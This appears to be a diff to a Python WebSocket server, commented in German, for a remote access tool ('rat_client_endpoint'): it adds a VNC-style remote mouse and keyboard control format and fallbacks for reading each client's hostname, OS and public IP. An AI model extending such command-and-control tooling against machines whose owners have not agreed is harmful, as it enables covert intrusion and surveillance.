@@ -77,6 +77,12 @@ async def websocket_endpoint(websocket: WebSocket):
                 break
 
             # --- Screenstream/Control Weiterleitung ---
+            # Für Fernsteuerung (VNC-Style) erwartet der Client:
+            # {
+            #   "action": "control",
+            #   "control_action": "move"|"click"|"mousedown"|"mouseup"|"scroll"|"keypress"|"keydown"|"keyup"|"type",
+            #   ...je nach Aktion weitere Felder wie x, y, button, key, text...
+            # }
             # Nutze target_id (empfohlen) oder client_id (Fallback)
             if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control'):
                 target = data.get('target_id') or data.get('client_id')
@@ -163,6 +169,13 @@ async def rat_client_endpoint(websocket: WebSocket):
         hostname = extract_hostname_from_sysinfo(sysinfo_data.get("output", ""))
         os_name = extract_os_from_sysinfo(sysinfo_data.get("output", ""))
         ip = extract_ip_from_sysinfo(sysinfo_data.get("output", ""))
+        # Fallbacks falls leer
+        if not hostname:
+            hostname = sysinfo_data.get("hostname", f"Client {client_id}")
+        if not os_name:
+            os_name = sysinfo_data.get("os", "")
+        if not ip:
+            ip = sysinfo_data.get("ip", "")
     except Exception as e:
         logging.warning(f"Fehler beim Empfangen von Systeminfos: {e}")
         hostname = f"Client {client_id}"
@@ -238,7 +251,7 @@ async def rat_client_endpoint(websocket: WebSocket):
 # --- Hilfsfunktionen zum Extrahieren von Infos ---
 def extract_hostname_from_sysinfo(sysinfo: str) -> str:
     for line in sysinfo.splitlines():
-        if line.lower().startswith("hostname:"):
+        if line.lower().startswith("hostname:") or line.lower().startswith("host:"):
             return line.split(":", 1)[1].strip()
     return ""
 
@@ -250,7 +263,7 @@ def extract_os_from_sysinfo(sysinfo: str) -> str:
 
 def extract_ip_from_sysinfo(sysinfo: str) -> str:
     for line in sysinfo.splitlines():
-        if line.lower().startswith("öffentliche ip:"):
+        if "öffentliche ip" in line.lower() or "public ip" in line.lower():
             return line.split(":", 1)[1].strip()
     return ""
 
